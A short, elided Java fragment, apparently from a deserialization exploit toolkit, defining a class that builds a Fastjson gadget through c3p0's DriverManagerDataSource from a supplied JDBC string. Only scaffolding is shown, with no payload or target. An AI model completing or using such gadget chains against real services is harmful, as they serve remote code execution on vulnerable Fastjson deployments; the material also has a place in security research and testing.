...
public class Fastjson4_DriverManagerDataSource_c3p0 {
    public Object getObject (String jdbc) throws Exception {

        Object node1 = DriverManagerDataSourceNode_c3p0.makeGadget(jdbc);
    ...
    public static void main(String[] args) throws Exception {
        ...
        Object object = new Fastjson4_DriverManagerDataSource_c3p0().getObject(jdbc);
